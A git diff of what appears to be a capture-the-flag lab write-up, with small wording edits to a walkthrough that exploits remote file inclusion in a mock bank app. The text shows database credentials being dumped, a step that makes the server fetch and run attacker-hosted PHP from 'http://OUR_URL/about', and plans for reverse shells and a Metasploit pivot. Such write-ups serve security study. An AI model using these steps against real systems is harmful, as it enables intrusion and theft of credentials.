@@ -111,7 +111,7 @@ Before we can do that, we'll need to use our session cookie with curl in order t
 
 ![screenshot](/assets/images/safeharbor/bank_rfi3.PNG)
 
-Outstanding! Now we have some DB creds for the MySQL instance. We also have the name of the database currently being queried: HarborBankUsers. We'll keep this in mind for a later time. At this point, I'm interested in seeing what we can include/how we can abuse this inclusion remotely. So far it seems the inclusion will add the php extension to the various pages we browse, and we're only allowed to include something that matches the following filenames: welcome, balance, transfer, account, about, logout. For us to get a shell we'll need to get crafty by naming our page within those allowed filenames, and find a command sequence that will result in a shell. 
+Outstanding! Now we have some DB creds for the MySQL instance. We also have the name of the database currently being queried: HarborBankUsers. We'll keep this in mind for a later time. At this point, I'm interested in seeing what we can include/how we can abuse this inclusion remotely. So far it seems the inclusion will add the php extension to the various pages we browse, and we're only allowed to include something that matches the following filenames: welcome, balance, transfer, account, about, and logout. For us to get a shell we'll need to get crafty by naming our page within those allowed filenames, and find a command sequence that will result in a shell. 
 
 # Container 1 - Shell
 
@@ -131,7 +131,9 @@ We'll save this as about.php, and host it with python in another terminal sessio
 python -m SimpleHTTPServer 80
 ```
 
-We risk executing php on our own system if we use the apache2 service on Kali...we don't want that. Remember, we suspect the application already adds the .php extension to includes, so we don't need to add it or use null-bytes or anything fancy. Just include http://OUR_URL/about
+We risk executing php on our own system if we use the apache2 service on Kali...we don't want that. Remember, we suspect the application already adds the .php extension to includes, so we don't need to add it or use null-bytes or anything fancy. Just include
+
+> http://OUR_URL/about
 
 ![screenshot](/assets/images/safeharbor/bank_rfi4.PNG)
 
@@ -159,7 +161,7 @@ Once this completes, we'll see in bright gold letters "[+] Looks like we're in a
 
 ![screenshot](/assets/images/safeharbor/container1_networking.PNG)
 
-There are a number of other hosts we can go after! A few of these look like they are probably copies of the current container we're in, so we will ignore those. We see there is a host called "harborbank_mysql_1". Let's add this to our list of things to continue enumerating, but first let's see if there are any other containers we can go after. To do this we'll need to drop a metasploit linux binary to help us pivot into the internal network. To make life easier (and as a shameful self-plug) we'll use the revshellgen.py script from my [github](https://github.com/m0rph-1/revshellgen). Revshellgen can generate a variety of reverse shell commands, and can make life easier if you don't have internet access for your current test or you are lazy like me and don't feel like googling what you need. 
+There are a number of other hosts we can go after! A few of these look like they are probably copies of the current container we're in, so we will ignore those. We see there is a host called "harborbank_mysql_1". Let's add this to our list of things to continue enumerating, but we also need to find out if there are any other containers we can go after. To do this we'll need to drop a metasploit linux binary to help us pivot into the internal network. To make life easier (and as a shameful self-plug) we'll use the revshellgen.py script from my [github](https://github.com/m0rph-1/revshellgen). Revshellgen can generate a variety of reverse shell commands, and can make life easier if you don't have internet access for your current test or you are lazy like me and don't feel like googling what you need. 
 
 ![screenshot](/assets/images/safeharbor/revshell_bin.PNG)
 
